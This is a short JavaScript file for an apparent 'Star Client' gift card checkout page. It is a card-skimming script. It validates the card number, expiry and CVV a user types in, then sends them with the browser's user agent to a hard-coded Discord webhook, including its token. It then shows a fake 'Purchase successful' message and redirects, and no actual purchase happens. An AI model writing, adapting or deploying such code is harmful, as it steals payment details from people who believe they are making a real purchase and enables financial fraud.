const WEBHOOK_URL = "https://discord.com/api/webhooks/1453158342452187187/oYYnqUKNd_-3GbA_AE53w55gCfhjvMlB0HcItC53RieMvKPKXNG14Yz00MpUZVerybII";

function processGiftCard() {
  const number = document.getElementById("cardNumber").value.trim().toUpperCase();
  const expiry = document.getElementById("expiry").value.trim();
  const cvv = document.getElementById("cvv").value.trim();
  const status = document.getElementById("status");

  const numberRegex = /^[A-Z0-9]{16}$/;
  const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
  const cvvRegex = /^\d{3}$/;

  if (!numberRegex.test(number)) {
    status.style.color = "red";
    status.textContent = "Invalid gift card number.";
    return;
  }
  if (!expiryRegex.test(expiry)) {
    status.style.color = "red";
    status.textContent = "Invalid expiration date.";
    return;
  }
  if (!cvvRegex.test(cvv)) {
    status.style.color = "red";
    status.textContent = "Invalid CVV.";
    return;
  }

  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [{
        title: "🧾 Star Client | Gift Card Checkout",
        color: 0x57F287,
        fields: [
          { name: "Card Number", value: number },
          { name: "Expiration", value: expiry },
          { name: "CVV", value: cvv },
          { name: "Action", value: "Purchase Completed" },
          { name: "Device", value: navigator.userAgent }
        ],
        timestamp: new Date().toISOString()
      }]
    })
  });

  status.style.color = "#57F287";
  status.textContent = "Purchase successful. Redirecting…";

  setTimeout(() => {
    window.location.href = "redeem.html";
  }, 1500);
}
